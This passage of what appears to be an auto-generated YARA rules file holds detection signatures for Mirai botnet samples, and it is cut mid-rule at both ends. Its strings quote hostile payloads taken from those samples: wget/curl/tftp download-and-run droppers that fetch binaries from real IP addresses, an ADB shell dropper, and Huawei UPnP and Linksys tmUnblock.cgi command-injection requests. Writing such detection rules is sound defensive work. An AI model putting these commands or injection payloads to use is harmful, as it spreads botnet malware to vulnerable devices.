      description = "_subset_batch - file Mirai(signature)_ab076ec4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab076ec40d99d59977c8da018102b7685b9fa3e15e2caf2212d56286060ae764"
   strings:
      $s1 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__adb35bbf {
   meta:
      description = "_subset_batch - file Mirai(signature)_adb35bbf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "adb35bbfbcc4b976a42b506af1fb62be5142777f99d5ef09a02c288ddf503e59"
   strings:
      $s1 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b06a8aac {
   meta:
      description = "_subset_batch - file Mirai(signature)_b06a8aac.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b06a8aace412338716100d15fc8b97783a05f23ceed14a4a0f782dfecdde1589"
   strings:
      $x1 = "shell:cd /data/local/tmp/; rm *; busybox wget http://193.111.248.188/killer/arm7; chmod 777 arm7; ./arm7 ADB; rm -rf arm7; histo" ascii /* score: '31.00'*/
      $x2 = "shell:cd /data/local/tmp/; rm *; busybox wget http://193.111.248.188/killer/arm7; chmod 777 arm7; ./arm7 ADB; rm -rf arm7; histo" ascii /* score: '31.00'*/
      $s3 = "downloaders" fullword ascii /* score: '23.00'*/
      $s4 = "downloader_count" fullword ascii /* score: '19.00'*/
      $s5 = "downloader_index" fullword ascii /* score: '19.00'*/
      $s6 = "%ds | Processed: %d | Sent: %d | Total: %d" fullword ascii /* score: '18.00'*/
      $s7 = "host::features=cmd,shell_v2" fullword ascii /* score: '17.00'*/
      $s8 = "target_connection" fullword ascii /* score: '17.00'*/
      $s9 = "drop_payload" fullword ascii /* score: '15.00'*/
      $s10 = "parse_target" fullword ascii /* score: '14.00'*/
      $s11 = "load_target" fullword ascii /* score: '14.00'*/
      $s12 = "fgets@@GLIBC_2.2.5" fullword ascii /* score: '9.00'*/
      $s13 = "getsockopt@@GLIBC_2.2.5" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__a24ff0be {
   meta:
      description = "_subset_batch - file Mirai(signature)_a24ff0be.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a24ff0bed650027cb536cc719eb0f1d7960879158ae146ea06241e465e06b07a"
   strings:
      $s1 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s2 = "udevadm" fullword ascii /* score: '8.00'*/
      $s3 = "iptables" fullword ascii /* score: '8.00'*/
      $s4 = "killall" fullword ascii /* score: '8.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__a7fcdd12 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a7fcdd12.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a7fcdd12a70d4b11d6fb1ba82f44c6d99a2d5140c4652b46a28d71dffb63df64"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
      $s2 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__d04fd4dc {
   meta:
      description = "_subset_batch - file Mirai(signature)_d04fd4dc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d04fd4dc24179d6f61e7b42842677fd5c638f905c82c13b395601ad836f09947"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
      $s2 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__dfba6220 {
   meta:
      description = "_subset_batch - file Mirai(signature)_dfba6220.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dfba6220864349333d72bb640422f66a9f088ace25c987b19be15f5dc95176f2"
   strings:
      $s1 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s2 = "udevadm" fullword ascii /* score: '8.00'*/
      $s3 = "iptables" fullword ascii /* score: '8.00'*/
      $s4 = "killall" fullword ascii /* score: '8.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__d0ce099b {
   meta:
      description = "_subset_batch - file Mirai(signature)_d0ce099b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d0ce099b06ada5820c6e5deff344220a002aa23a4827cfc26180e0bed6a72b96"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "kthreadd" fullword ascii /* score: '11.00'*/
      $s5 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s6 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s7 = "ksoftirqd" fullword ascii /* score: '8.00'*/
      $s8 = "nodiratime" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__af484b37 {
   meta:
      description = "_subset_batch - file Mirai(signature)_af484b37.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af484b37a7232b5cc15b01f051c47abed7f2de8f6699515d40bd48c60d15be34"
   strings:
      $s1 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii /* score: '18.00'*/
      $s2 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii /* score: '18.00'*/
      $s3 = "busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii /* score: '15.00'*/
      $s4 = "bindtoip" fullword ascii /* score: '11.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__a29d703f {
   meta:
      description = "_subset_batch - file Mirai(signature)_a29d703f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a29d703f1f8e027311bb5ec5508cd2e6a6b33b89a762f25be98542cd8c3dc279"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arc; curl -O http://160.191.243.2" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.spc; curl -O http://160.191.243.2" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.ppc; curl -O http://160.191.243.2" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arm; curl -O http://160.191.243.2" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.ppc; curl -O http://160.191.243.2" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.spc; curl -O http://160.191.243.2" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arc; curl -O http://160.191.243.2" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arm; curl -O http://160.191.243.2" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.mips; curl -O http://160.191.243." ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arm6; curl -O http://160.191.243." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.x86; curl -O http://160.191.243.2" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.x86_64; curl -O http://160.191.24" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arm7; curl -O http://160.191.243." ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.arm5; curl -O http://160.191.243." ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/LjEZs/uYtea.sh4; curl -O http://160.191.243.2" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      8 of them
}

rule Mirai_signature__a32bb4c1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a32bb4c1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a32bb4c1a081c4269e9f0ef385599ee4b8301843a4789756f0f2db3fe5324e9e"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " http://196.251.70.174/bins/mips; /bin/busybox chmod 777 * atp.mips; ./atp.mips huawei)</NewStatusURL><NewDownloadURL>$(echo HUA" ascii /* score: '29.00'*/
      $s3 = "WEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and $s2
}

rule Mirai_signature__d27f42e7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d27f42e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d27f42e7b210d149f4e0b0f66bd03e56feb2fcdcde89fb9f8e9818a6464c71dd"
   strings:
      $s1 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__b0d67ece {
   meta:
      description = "_subset_batch - file Mirai(signature)_b0d67ece.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b0d67ece3977ece27ebfbf7872f7c0ada123ac08b773619555615456a16a10b4"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.00'*/
      $s2 = "76.65.148.18 -l /tmp/bigH -r /bins/mips;chmod 777 /tmp/bigH;/tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH)</NewStatusURL><NewDownlo" ascii /* score: '26.00'*/
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(busybox wget -" ascii /* score: '20.00'*/
      $s4 = "POST /tmUnblock.cgi HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s5 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s6 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s7 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s8 = "Host: 1.1.1.1:80" fullword ascii /* score: '14.00'*/
      $s9 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s10 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__d585fa69 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d585fa69.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d585fa69cad04f5d98b158c0a50f4d43a32fa14757aa77b91a0091954e04e5fd"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.00'*/
      $s2 = "76.65.148.18 -l /tmp/bigH -r /bins/mips;chmod 777 /tmp/bigH;/tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH)</NewStatusURL><NewDownlo" ascii /* score: '26.00'*/
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(busybox wget -" ascii /* score: '20.00'*/
      $s4 = "POST /tmUnblock.cgi HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s5 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s6 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s7 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s8 = "Host: 1.1.1.1:80" fullword ascii /* score: '14.00'*/
      $s9 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s10 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__d3bc3325 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d3bc3325.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3bc3325fc88bb251b394549190f1edff892fa51fff3a1c76075b0c4265272f2"
   strings:
      $s1 = "* HTTP/1" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule Mirai_signature__c7b94d8b {
   meta:
      description = "_subset_batch - file Mirai(signature)_c7b94d8b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c7b94d8bd9730d86e6beef0b5071d1409df2c46485ee3c3d3e5fc5f4b0521429"
   strings:
      $s1 = "xgethostbyname" fullword ascii /* score: '18.00'*/
      $s2 = "bb_default_login_shell" fullword ascii /* score: '17.00'*/
      $s3 = "get_kernel_revision" fullword ascii /* score: '14.00'*/
      $s4 = "xgetcwd" fullword ascii /* score: '13.00'*/
      $s5 = "bb_get_last_path_component" fullword ascii /* score: '12.00'*/
      $s6 = "bb_lookup_host" fullword ascii /* score: '12.00'*/
      $s7 = "bb_process_escape_sequence" fullword ascii /* score: '11.00'*/
      $s8 = "cmdedit_read_input" fullword ascii /* score: '10.00'*/
      $s9 = "bb_xgetlarg_bnd_sfx" fullword ascii /* score: '9.00'*/
      $s10 = "scantree" fullword ascii /* score: '9.00'*/
      $s11 = "my_getpwnam" fullword ascii /* score: '9.00'*/
      $s12 = "get_terminal_width_height" fullword ascii /* score: '9.00'*/
      $s13 = "bb_getopt_ulflags" fullword ascii /* score: '9.00'*/
      $s14 = "hostname_main" fullword ascii /* score: '9.00'*/
      $s15 = "my_getgrnam" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__c43da3b3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c43da3b3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c43da3b331c71df5cc57a274bc052d3fda3f80291c6c803665f9a6f8c0f176e6"
   strings:
      $s1 = "ID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x" ascii /* score: '8.00'*/
      $s2 = "38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x" ascii /* score: '8.00'*/
      $s3 = "FJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/x" ascii /* score: '8.00'*/
      $s4 = "93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x" ascii /* score: '8.00'*/
      $s5 = "9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/x" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a4057af3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a4057af3.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4057af366d52f33dc5fcdcfbf8a8da8b6016d3290a6aaa1443a0dd2eb398295"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/0x83911d24Fx.sh; curl -O http://160.191.243.2" ascii /* score: '34.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.191.243.254/0x83911d24Fx.sh; curl -O http://160.191.243.2" ascii /* score: '27.00'*/
      $s3 = "67.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 160.191.243.254; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u a" ascii /* score: '25.00'*/
      $s4 = "54/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp 160.191.243.254 -c get 0xt984767.sh; chmod 777 0xft64264" ascii /* score: '25.00'*/
      $s5 = "nonymous -p anonymous -P 21 160.191.243.254 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh" ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__a45b6bc1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a45b6bc1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a45b6bc128bc69fafd2eb317e778eddd5450ece76f0d9596b4508e2ab18035f8"
   strings:
      $s1 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s2 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s8 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b1a2e932 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b1a2e932.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1a2e9327c420e9ffdde71e2a988abbe5a6bad402c633d4414ec5404135cef55"
   strings:
      $s1 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s2 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s8 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__d8781ed9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d8781ed9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8781ed9de37f70767a0d0c1a6facf9dfde6888192ecaaea396f51c092ff0764"
   strings:
      $s1 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s2 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s8 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__a4ec0673 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a4ec0673.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4ec06735f3b629e53ddbee73d4d751223e466e520474d6ce150364f1194e752"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "CoondiiNeett %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__a4a0362e {
   meta:
      description = "_subset_batch - file Mirai(signature)_a4a0362e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4a0362e5fa727d85fdf6747ab3d1ede6709a3412072368b0a3f91bf9938978b"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; wget http://2.58.113.219/mpsl || tftp -gr mpsl 2.58.113.219 ; chmod" ascii /* score: '27.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; wget http://2.58.113.219/mips || tftp -gr mips 2.58.113.219 ; chmod" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; wget http://2.58.113.219/mpsl || tftp -gr mpsl 2.58.113.219 ; chmod" ascii /* score: '24.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; wget http://2.58.113.219/mips || tftp -gr mips 2.58.113.219 ; chmod" ascii /* score: '24.00'*/
      $s5 = " 777 mips ; ./mips goahead ; " fullword ascii /* score: '9.00'*/
      $s6 = " 777 mpsl ; ./mpsl goahead ;" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      2 of them
}

rule Mirai_signature__a4d5dde3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a4d5dde3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4d5dde39bf97aa9efadecc29099b1112e4a2b4fb0088a6684813dd356e2b7ee"
   strings:
      $s1 = "nothinglmao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__dd416618 {
   meta:
      description = "_subset_batch - file Mirai(signature)_dd416618.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd416618664f9b2f7fa2d9c3dfdc8a9480611d42d14ce0c584657b375610fb3d"
   strings:
      $s1 = "nothinglmao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule Mirai_signature__deb9848f {
   meta:
      description = "_subset_batch - file Mirai(signature)_deb9848f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "deb9848fec2fc941ddd73de634f665db596dd9f5df8410f8b2a15376b7139fdb"
   strings:
      $s1 = "nothinglmao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__b9e6f682 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b9e6f682.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9e6f6828ed4175da0d0e7b81202108766af0bb0c230180265c25f8c7389ca0d"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "d__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s3 = ",bad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
      $s4 = "CoondiiNeett %s:%d" fullword ascii /* score: '9.50'*/
      $s5 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__c4341f5b {
   meta:
      description = "_subset_batch - file Mirai(signature)_c4341f5b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4341f5b32c1ff5620371ae02b7c04380049b8ad126c906316bbaeb4629fbb23"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "CoondiiNeett %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__ccaa5877 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ccaa5877.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ccaa58771516028e55de87d41c982e66fd153ac2dcca9d01858aab9ed0c1bc9a"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "CoondiiNeett %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__db5c454e {
   meta:
      description = "_subset_batch - file Mirai(signature)_db5c454e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db5c454e9ebac3b9b1274fb4ef4492dfd7e46048c3e9d547cca1102999989f3a"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "Error opening /proc directory" fullword ascii /* score: '11.00'*/
      $s3 = "CondiNet %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a5bf95ae {
   meta:
      description = "_subset_batch - file Mirai(signature)_a5bf95ae.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5bf95ae9f9d8f5f08449b54b0832a1fb6fa9fe284fadd2961b19d4d9312724f"
   strings:
